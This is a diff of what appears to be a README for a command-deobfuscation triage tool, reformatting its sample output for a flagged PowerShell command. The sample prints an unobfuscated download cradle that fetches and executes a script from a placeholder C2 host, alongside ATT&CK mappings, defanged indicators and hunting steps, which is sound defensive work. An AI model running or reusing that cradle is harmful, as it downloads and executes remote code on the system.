@@ -89,26 +89,26 @@ cmd-unmask --benchmark -v
 
 ```text
 +----------------------------------------------------------------------------+
-| Triage Verdict [cli] | Severity: HIGH (70/100)                             |
+| CMD-UNMASK [cli] | HIGH (70/100)                                           |
 +----------------------------------------------------------------------------+
-| Exec Brief    : C2/Ingress: external network target(s)                     |
-|                 http://c2.evil.example:8080/stage.ps1, c2.evil.example...  |
+| Suspicious powershell activity (HIGH 70/100) targeting                     |
+| http://c2.evil.example:8080/stage.ps1. Key flag: -NoP / -NoProfile.        |
 +----------------------------------------------------------------------------+
 
-[1] FINDINGS & EVIDENCE
-  - T1059.001 (Execution) - PowerShell Suspicious Execution / Cradle: -W Hidden (Step 0 [Raw Input])
-  - T1105 (Command and Control) - Ingress Tool Transfer / Remote Download Cradle: Net.WebClient (Step 0 [Raw Input])
-  - [CAPABILITY] Network: Net.WebClient
-  - [CAPABILITY] Network: DownloadString
-  - [RATIONALE] HIGH (70/100) driven by: Ingress Tool Transfer / Remote Download Cradle [T1105]; PowerShell Suspicious Execution / Cradle [T1059.001].
-
-[2] IOCs & NEXT STEPS
-  - [url] hxxp://c2[.]evil[.]example[:]8080/stage.ps1 (DEFANGED, from Step 0 [Raw Input])
-  - [domain] c2[.]evil[.]example (DEFANGED, from Step 0 [Raw Input])
-  1. Hunt and block network target(s) (hxxp://c2[.]evil[.]example[:]8080/stage.ps1, c2[.]evil[.]example) across firewall, proxy, and DNS logs.
-
-[3] PAYLOAD
+[1] UNMASKED COMMAND (Unobfuscated)
   powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')
+
+[2] THREAT BREAKDOWN
+  - T1059.001 Execution            PowerShell Suspicious Execution / Cradle (-W Hidden)
+  - T1105     Command and Control  Ingress Tool Transfer / Remote Download Cradle (Net.WebClient)
+  - [CAPABILITY] Network: DownloadString
+
+[3] DEFANGED IOCs
+  - URL    hxxp://c2[.]evil[.]example[:]8080/stage.ps1
+  - DOMAIN c2[.]evil[.]example
+
+[4] NEXT STEPS
+  1. Hunt and block network target(s) (hxxp://c2[.]evil[.]example[:]8080/stage.ps1, c2[.]evil[.]example) across firewall, proxy, and DNS logs.
 ```
 
 ---
